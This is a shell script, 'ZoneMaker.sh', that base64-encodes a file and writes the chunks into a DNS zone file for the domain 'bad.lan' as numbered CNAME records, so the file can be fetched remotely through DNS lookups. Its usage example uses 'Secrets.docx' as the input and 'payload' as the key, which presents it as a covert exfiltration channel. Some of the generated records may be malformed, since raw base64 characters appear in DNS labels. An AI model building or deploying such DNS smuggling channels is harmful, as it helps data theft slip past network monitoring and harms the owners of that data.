#!/bin/sh
# ZoneMaker.sh
# Christopher Neitzert <chris@neitzert.com>
#
# Simple script to take a file and base64 encode
# it and write it into a DNS zone file for 
# remote serving to anyone who can look up
# the resolving domain name.
#  
# File can be retreived and decoded remotely 
# using "ZoneGet.sh"
#
# Useage
# ./zonemaker.sh inputfile zonefile serialnumber key
# 
# example:
#	./zonemaker Secrets.docx /var/named/bad.lan.db 1010 payload
#
# Variables
counter=$3
B64=$(printf "$1"'.B64')
zonefile=$2
echo "Original document is $1"
echo "Base64 output file created as $B64"
/bin/base64 $1 |/bin/base64 -w 55 > $B64
#
echo "creating zonefile $zonefile"
echo "\$TTL    86400 ; 
\$ORIGIN bad.lan.
@  1D  IN  SOA ns1.bad.lan. hostmaster.bad.lan. ("  > $2
echo       $((counter+1))"; serial
3H        ; refresh
15        ; retry
1w        ; expire
3h        ; nxdomain ttl
)
       IN  NS     ns1.bad.lan.          
       IN  MX  10 mail.bad.lan.        
ns1    IN  A      10.10.10.1            
mail   IN  A      10.10.10.1           
www    IN  A      10.10.10.1            
server IN  CNAME  www.bad.lan.          
ns     IN  A      10.10.10.1            
client IN  A      10.10.10.10           
ftp    IN  A      10.10.10.1            
;;
;; Begin Payload of zone file
;;" >> $2
#
for line in $(cat -n $B64 | sed 's/^\s*//'|sed -e "s/[[:space:]]\+/-/g")
do
echo $line "         IN      CNAME   $4." >> $2
done
